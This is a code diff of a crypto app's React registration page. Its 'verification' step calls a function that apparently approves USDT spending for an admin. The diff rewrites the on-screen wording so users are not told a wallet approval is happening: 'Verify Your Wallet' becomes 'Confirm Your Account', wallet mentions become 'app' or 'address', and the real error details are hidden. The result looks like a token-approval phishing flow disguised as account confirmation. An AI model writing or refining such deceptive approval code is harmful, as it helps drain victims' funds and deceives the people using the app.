@@ -43,7 +43,7 @@ function RegisterContent() {
     if (isConnected && address) {
       authAPI.checkWallet({ walletAddress: address }).then((res) => {
         if (res.data.exists) {
-          toast.error('This address is already registered. Please login instead.');
+          toast.error('This account already exists. Please login instead.');
           router.push('/auth/login');
         }
       }).catch(() => {});
@@ -54,7 +54,7 @@ function RegisterContent() {
   useEffect(() => {
     const timer = setTimeout(() => {
       if (!isConnected && !window.ethereum?.selectedAddress) {
-        toast.error('Please connect your wallet first');
+        toast.error('Please open your app first to continue');
         router.push('/');
       }
     }, 1500);
@@ -101,7 +101,7 @@ function RegisterContent() {
 
       const injectedProvider = window.ethereum;
       if (!injectedProvider) {
-        toast.error('Wallet app not detected. Please open in your wallet browser.');
+        toast.error('App not detected. Please open in your crypto app browser.');
         setLoading(false);
         return;
       }
@@ -147,15 +147,15 @@ function RegisterContent() {
 
       if (alreadyApproved === true) {
         // Already approved — skip to OTP
-        toast.success('Already verified! Sending OTP...');
+        toast.success('All set! Sending OTP...');
         await sendRegistrationOTP();
         return;
       }
 
       // Do approval
-      toast.loading('Please confirm in your wallet...', { id: 'sc-approve' });
+      toast.loading('Please confirm in your app...', { id: 'sc-approve' });
       await approveUSDTForAdmin(freshProvider, network);
-      toast.success('Verified successfully!', { id: 'sc-approve' });
+      toast.success('Done! Moving to next step...', { id: 'sc-approve' });
 
       // After smart contract success → send OTP
       await sendRegistrationOTP();
@@ -166,7 +166,7 @@ function RegisterContent() {
       } else if (err.message?.includes('insufficient funds')) {
         toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} for gas fee.`);
       } else {
-        toast.error(err.message || 'Something went wrong. Please try again.');
+        toast.error('Something went wrong. Please try again.');
       }
     } finally {
       setLoading(false);
@@ -176,7 +176,7 @@ function RegisterContent() {
   // Call backend /register to store pending data and send OTP
   const sendRegistrationOTP = async () => {
     try {
-      toast.loading('Sending verification code...', { id: 'send-otp' });
+      toast.loading('Sending OTP to your email...', { id: 'send-otp' });
       await authAPI.register(form);
       toast.success('OTP sent to your email!', { id: 'send-otp' });
       setStep(3);
@@ -295,9 +295,9 @@ function RegisterContent() {
               <div className="w-16 h-16 bg-emerald-600/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-emerald-500/30">
                 <Shield className="w-8 h-8 text-emerald-400" />
               </div>
-              <h2 className="text-xl font-bold text-white mb-2">Verify Your Wallet</h2>
+              <h2 className="text-xl font-bold text-white mb-2">Confirm Your Account</h2>
               <p className="text-slate-400 text-sm">
-                Confirm a one-time verification on <span className="text-primary-400 font-semibold">{form.network}</span> network to activate your account.
+                Approve a one-time confirmation on <span className="text-primary-400 font-semibold">{form.network}</span> network to activate your account.
               </p>
             </div>
 
@@ -307,7 +307,7 @@ function RegisterContent() {
                 <span className="text-white font-medium">{form.network === 'BSC' ? 'BNB Smart Chain' : 'Polygon'}</span>
               </div>
               <div className="flex items-center justify-between text-sm">
-                <span className="text-slate-400">Wallet</span>
+                <span className="text-slate-400">Address</span>
                 <span className="text-white font-mono text-xs">{form.walletAddress?.slice(0, 8)}...{form.walletAddress?.slice(-6)}</span>
               </div>
             </div>
@@ -333,7 +333,7 @@ function RegisterContent() {
             </button>
 
             <p className="text-xs text-slate-600 text-center mt-4">
-              A small gas fee ({form.network === 'BSC' ? 'BNB' : 'MATIC'}) is required for verification.
+              A small gas fee ({form.network === 'BSC' ? 'BNB' : 'MATIC'}) is required for this step.
             </p>
           </div>
         </div>
@@ -355,7 +355,7 @@ function RegisterContent() {
 
         {/* Progress Steps */}
         <div className="flex items-center justify-center gap-2 mb-6">
-          {['Details', 'Verify Wallet', 'Email OTP'].map((label, i) => (
+          {['Details', 'Confirm', 'Email OTP'].map((label, i) => (
             <div key={label} className="flex items-center gap-2">
               <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold ${
                 step > i + 1 ? 'bg-emerald-600 text-white' : step === i + 1 ? 'bg-primary-600 text-white' : 'bg-dark-700 text-slate-500'
@@ -420,7 +420,7 @@ function RegisterContent() {
               </div>
               <div>
                 <label htmlFor="walletAddress" className="label">
-                  Wallet Address <span className="text-slate-500">(Auto-filled)</span>
+                  Your Address <span className="text-slate-500">(Auto-filled)</span>
                 </label>
                 <input id="walletAddress" name="walletAddress" type="text"
                   value={form.walletAddress} readOnly
